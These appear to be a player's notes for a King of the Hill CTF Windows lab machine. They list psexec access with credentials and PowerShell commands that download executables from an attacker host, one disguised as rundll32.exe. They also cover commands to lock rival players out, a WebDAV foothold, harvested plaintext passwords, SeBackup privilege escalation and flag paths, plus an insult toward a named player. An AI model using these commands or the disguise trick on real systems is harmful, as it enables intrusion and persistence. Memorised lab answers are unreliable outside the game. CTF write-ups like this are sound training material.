# Offline KOTH machine

can go straight to system with `psexec.py kingofthe.domain/svc_robotarmy:robots@10.10.34.8`

## tools

as this is a windows box, downloading files can be done over powershell:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/kmw.exe','kmw.exe')"
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
```

and king.txt, under Administrator/king-server/, can be made immutable with the `attrib +r king.txt` command. note the `icacls` command could also be used to mess with permissions. can use `takeown /f .\king.txt` as a quick recover if someone else has taken over the file

when dealing with dicks like matheuzsec, do the following:

```
net user svc_robotarmy sdfsjkfskkjiouuiyeruiysdf
[establish a russh shell]
taskkill /f /pid powershell.exe
taskkill /f /pid cmd.exe
```

basically will lock down that method of access (but you can still get in via rushh obvs).

## other ways

path to foothold:

- the webserver on :80 supports webdav. with a tool like `cadaver` it can be browsed and uploaded to. in it is the creds for the scara user: `scara:LeagueIsMyLove`
- once on the machine winpeas reveals several more user creds:

  - `scarra:LeagueIsMyLove`
  - `toast:IsItHotInHere,OrIsItJustMe`
  - `mykull:NightmareNightmareNightmareNightmare`
  - `fed:OfflineTV2020`

Other users include poki, lily, yvonne (possible password in smb, though doesnt seem to work), SVC_ROBOTARMY

SVC_ROBOTARMY <- i think this is an admin account. maybe should do some kerboroasting or something

path to admin:

- `mykull` has SeBackup. by importing https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1, the permissions to the administrator home folder (or any folder) can be changed. editing king under king-server doesnt seem to work though - might require no newline

## Flags

- c:\Users\Administrator\flag.txt
- c:\Users\fed\flag.txt
- c:\Users\lily\flag.txt
- c:\Users\mykull\flag.txt
- c:\Users\poki\flag.txt
- c:\Users\scarra\flag.txt
- c:\Users\toast\flag.txt
- c:\Users\yvonne\flag.txt

